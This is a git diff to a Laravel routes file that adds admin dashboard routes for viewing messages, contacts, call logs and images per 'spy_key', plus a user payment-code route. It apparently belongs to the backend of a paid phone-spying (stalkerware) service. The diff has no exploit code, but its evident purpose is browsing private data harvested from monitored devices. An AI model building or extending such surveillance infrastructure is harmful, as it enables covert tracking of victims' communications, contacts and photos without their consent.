@@ -37,12 +37,21 @@ Route::get('admin/logout', [AdminLoginController::class, 'admin_logout'])->name(
 Route::get('dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
 //admin users
 Route::get('dashboard/users', [AdminController::class, 'users'])->name('dashboard.users.index');
+Route::get('dashboard/users/{user_id}', [AdminController::class, 'view_users'])->name('dashboard.users.view');
+Route::put('dashboard/add/{user_id}', [AdminController::class, 'add_payment_code'])->name('admin.add.payment');
 //admin messages
 Route::get('dashboard/messages', [AdminController::class, 'messages'])->name('dashboard.messages.index');
-Route::get('dashboard/messages/{device}', [AdminController::class, 'get_messages_by_device'])->name('dashboard.messages.show');
+Route::get('dashboard/messages/{spy_key}', [AdminController::class, 'get_messages_by_spy_key'])->name('dashboard.messages.show');
 //admin contacts
 Route::get('dashboard/contacts', [AdminController::class, 'contacts'])->name('dashboard.contacts.index');
-Route::get('dashboard/contacts/{device}', [AdminController::class, 'get_contacts_by_device'])->name('dashboard.contacts.show');
+Route::get('dashboard/contacts/{spy_key}', [AdminController::class, 'get_contacts_by_spy_key'])->name('dashboard.contacts.show');
+//admin call logs
+Route::get('dashboard/call_logs', [AdminController::class, 'call_logs'])->name('dashboard.call_logs.index');
+Route::get('dashboard/call_logs/{spy_key}', [AdminController::class, 'get_call_logs_by_spy_key'])->name('dashboard.call_logs.show');
+//admin images
+Route::get('dashboard/images', [AdminController::class, 'get_images'])->name('dashboard.images.index');
+Route::get('dashboard/images/{spy_key}', [AdminController::class, 'get_images_by_spy_key'])->name('dashboard.images.show');
+
 
 //users authentication
 Route::get('user/login', [ClientLoginController::class, 'show_login'])->name('show.login');
